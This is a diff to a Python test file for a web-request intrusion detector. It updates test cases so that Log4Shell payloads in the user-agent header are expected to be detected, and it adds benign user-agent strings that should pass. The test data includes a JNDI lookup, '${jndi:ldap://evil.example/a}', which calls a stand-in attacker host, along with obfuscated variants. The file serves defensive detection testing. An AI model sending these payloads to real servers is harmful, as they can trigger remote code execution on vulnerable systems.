@@ -552,24 +552,6 @@ _BACKTICK_SQL_KEYWORD_EXEMPTION_BYPASS_TARGETED_CASES: list[TargetedCase] = [
 ]
 
 
-_LOG4SHELL_USER_AGENT_EXCLUDED_HEADER_KNOWN_GAP_REASON = (
-    "detect_penetration_attempt's _scan_headers unconditionally skips "
-    "user-agent via the hardcoded _DEFAULT_EXCLUDED_HEADERS set in "
-    "guard_core/utils.py before any pattern, including the jndi pattern "
-    "extended to header context this round, ever runs against it; "
-    "excluded_detection_headers can only add to that set, never remove "
-    "from it, so no SecurityConfig can undo the exclusion. Extending the "
-    "jndi pattern's own context set (this round's scope) cannot reach "
-    "content the header-scanning loop never hands it in the first place. "
-    "Confirmed detected via a non-default-excluded header "
-    "(x-e2e-probe) and at the pattern layer directly (context='header'); "
-    "the same payload via user-agent specifically stays undetected "
-    "end-to-end. Lifting the user-agent exclusion is a change to a "
-    "different mechanism in a different file, affecting every detection "
-    "category's header scanning, not only jndi, so it stays a reported, "
-    "unresolved gap rather than an in-scope fix"
-)
-
 _ROUND6_CMD_SUBSTITUTION_TARGETED_CASES: list[TargetedCase] = [
     TargetedCase(
         "round6_log4shell_direct_ldap_query_param",
@@ -639,20 +621,55 @@ _ROUND6_CMD_SUBSTITUTION_TARGETED_CASES: list[TargetedCase] = [
     TargetedCase(
         "round6_log4shell_direct_ldap_user_agent",
         _user_agent_header_request("${jndi:ldap://evil.example/a}"),
-        False,
-        _LOG4SHELL_USER_AGENT_EXCLUDED_HEADER_KNOWN_GAP_REASON,
+        True,
     ),
     TargetedCase(
         "round6_log4shell_obfuscated_lower_user_agent",
         _user_agent_header_request("${lower:j}ndi"),
-        False,
-        _LOG4SHELL_USER_AGENT_EXCLUDED_HEADER_KNOWN_GAP_REASON,
+        True,
     ),
     TargetedCase(
         "round6_log4shell_obfuscated_default_value_user_agent",
         _user_agent_header_request("${::-j}ndi"),
+        True,
+    ),
+    TargetedCase(
+        "round6_chaotic_user_agent_chrome_windows_benign",
+        _user_agent_header_request(
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+            "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        ),
         False,
-        _LOG4SHELL_USER_AGENT_EXCLUDED_HEADER_KNOWN_GAP_REASON,
+    ),
+    TargetedCase(
+        "round6_chaotic_user_agent_safari_macos_benign",
+        _user_agent_header_request(
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
+            "(KHTML, like Gecko) Version/17.0 Safari/605.1.15"
+        ),
+        False,
+    ),
+    TargetedCase(
+        "round6_chaotic_user_agent_googlebot_benign",
+        _user_agent_header_request(
+            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+        ),
+        False,
+    ),
+    TargetedCase(
+        "round6_chaotic_user_agent_curl_benign",
+        _user_agent_header_request("curl/8.4.0"),
+        False,
+    ),
+    TargetedCase(
+        "round6_chaotic_user_agent_python_requests_benign",
+        _user_agent_header_request("python-requests/2.31.0"),
+        False,
+    ),
+    TargetedCase(
+        "round6_chaotic_user_agent_postman_benign",
+        _user_agent_header_request("PostmanRuntime/7.36.0"),
+        False,
     ),
 ]
 
